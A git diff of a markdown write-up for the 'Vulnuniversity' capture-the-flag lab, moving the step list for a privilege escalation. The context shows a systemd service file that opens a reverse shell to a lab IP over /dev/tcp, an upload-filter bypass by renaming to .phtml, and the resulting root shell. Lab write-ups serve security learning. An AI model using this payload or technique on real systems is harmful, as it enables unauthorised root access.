@@ -116,8 +116,6 @@ Using the command `find`, we get:
 
 For this privesc, I followed [Alvin Smith's Privilege Escalation](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)
 
-Here are the steps:
-1. create a `root.service` file on your machine with the details
 ```
 [Unit]
 Description=roooooooooot
@@ -131,6 +129,9 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'
 WantedBy=multi-user.target
 ```
 
+
+Here are the steps:
+1. create a `root.service` file on your machine with the details given above.
 2. Using the upload option in the `/internal/` directory of the website, upload this file. It'll throw and error of the extension as not permitted. Change `root.service` to `root.phtml` (why?) and you should be good to go.
 3. In the target machine, just rename the file again.
 4. Instead of 2, 3, you can also use `nc` or any other methods you prefer.
@@ -181,3 +182,4 @@ cat root.txt
 {hell yeah}
 root@vulnuniversity:~# 
 ```
+
